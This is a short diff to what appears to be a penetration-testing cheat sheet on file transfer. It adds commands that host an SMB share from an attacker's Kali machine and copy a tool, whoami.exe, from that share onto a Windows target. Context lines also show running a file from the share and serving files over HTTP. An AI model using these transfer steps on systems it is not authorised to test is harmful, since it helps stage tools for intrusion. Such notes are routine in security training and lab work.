@@ -195,7 +195,11 @@ cmd.exe /c //<your kali IP>/Share/<file name you want>
 net use \\<your kali IP>\share /u:df df
 copy \\<your kali IP>\share\<file wanted>
 ````
-
+````
+smbserver.py -smb2support Share .
+net use \\<your kali IP>\share
+copy \\<your kali IP>\share\whoami.exe
+````
 ### Windows http server
 ````
 python3 -m http.server 80
